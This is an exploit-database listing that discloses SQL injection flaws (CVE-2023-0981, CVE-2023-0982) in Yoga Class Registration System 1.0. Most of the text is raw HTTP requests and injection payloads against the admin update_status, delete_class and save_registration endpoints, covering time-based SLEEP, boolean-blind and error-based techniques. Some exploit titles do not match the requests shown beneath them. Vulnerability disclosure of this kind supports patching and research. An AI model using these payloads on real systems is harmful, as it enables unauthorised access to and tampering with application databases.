---
title: Yoga Class Registration System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023020039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-25
fetch_date: 2025-10-04T08:03:24.387983
---

# Yoga Class Registration System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Yoga Class Registration System 1.0 SQL Injection** **2023.02.24**  Credit:  **[Ahmed Ismail](https://cxsecurity.com/author/Ahmed%2BIsmail/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-0982](https://cxsecurity.com/cveshow/CVE-2023-0982/ "Click to see CVE-2023-0982")** | **[CVE-2023-0981](https://cxsecurity.com/cveshow/CVE-2023-0981/ "Click to see CVE-2023-0981")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Authenticated POST based SQL Injection when delete user on Yoga Class Registration System
# Google Dork: NA
# Date: 23/2/2023
# Exploit Author: Ahmed Ismail (@MrOz1l)
# Vendor Homepage: https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html
# Software Link: [download link if available]
# Version: 1.0
# CVE: [CVE-2023-0982]
# Tested on: Windows 11
# Payload
GET /php-ycrs/admin/registrations/update\_status.php?id=2'+AND+(SELECT+7828+FROM+(SELECT(SLEEP(3)))Mvkn)--+yLjU HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)
Gecko/20100101 Firefox/110.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer:
http://localhost/php-ycrs/admin/?page=registrations/view\_registration&id=2
Cookie: PHPSESSID=tcc4d9ffr86hm2dqlfmos7amhg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
##Payload
'+AND+(SELECT+7828+FROM+(SELECT(SLEEP(3)))Mvkn)--+yLjU
the back-end DBMS is MySQL
web application technology: PHP 8.0.25, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
# Exploit Title: Authenticated POST based SQL Injection when delete user on Yoga Class Registration System
# Google Dork: NA
# Date: 23/2/2023
# Exploit Author: Ahmed Ismail (@MrOz1l)
# Vendor Homepage: https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html
# Software Link: [download link if available]
# Version: 1.0
# CVE: ( CVE-2023-0981 )
# Tested on: Windows 11
```
POST /php-ycrs/classes/Master.php?f=delete\_class HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)
Gecko/20100101 Firefox/110.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 6
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ycrs/admin/?page=classes
Cookie: PHPSESSID=tcc4d9ffr86hm2dqlfmos7amhg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
id=96'
```
# Payload
Parameter: id (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause (subquery -
comment)
Payload: id=96' AND 2307=(SELECT (CASE WHEN (2307=2307) THEN 2307 ELSE
(SELECT 8487 UNION SELECT 3172) END))-- -
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
BY clause (FLOOR)
Payload: id=96' AND (SELECT 4409 FROM(SELECT
COUNT(\*),CONCAT(0x7162707671,(SELECT
(ELT(4409=4409,1))),0x71716b6b71,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)-- NiQL
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=96' AND (SELECT 9070 FROM (SELECT(SLEEP(5)))jayu)-- wkzQ
# Exploit Title: Authenticated POST based SQL Injection when add class on Yoga Class Registration System
# Google Dork: NA
# Date: 23/2/2023
# Exploit Author: Ahmed Ismail (@MrOz1l)
# Vendor Homepage: https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html
# Software Link: [download link if available]
# Version: 1.0
# CVE: ( CVE-2023-0982 )
# Tested on: Windows 11
##Payload
POST /php-ycrs/classes/Master.php?f=save\_registration HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)
Gecko/20100101 Firefox/110.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------408548517113152447833471217322
Content-Length: 286
Origin: http://localhost
Connection: close
Referer:
http://localhost/php-ycrs/admin/?page=registrations/view\_registration&id=2
Cookie: PHPSESSID=tcc4d9ffr86hm2dqlfmos7amhg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
-----------------------------408548517113152447833471217322
Content-Disposition: form-data; name="id"
2'
-----------------------------408548517113152447833471217322
Content-Disposition: form-data; name="status"
1
-----------------------------408548517113152447833471217322--
##Payload
'+AND+(SELECT+7828+FROM+(SELECT(SLEEP(3)))Mvkn)--+yLjU
the back-end DBMS is MySQL
web application technology: PHP 8.0.25, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020039)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top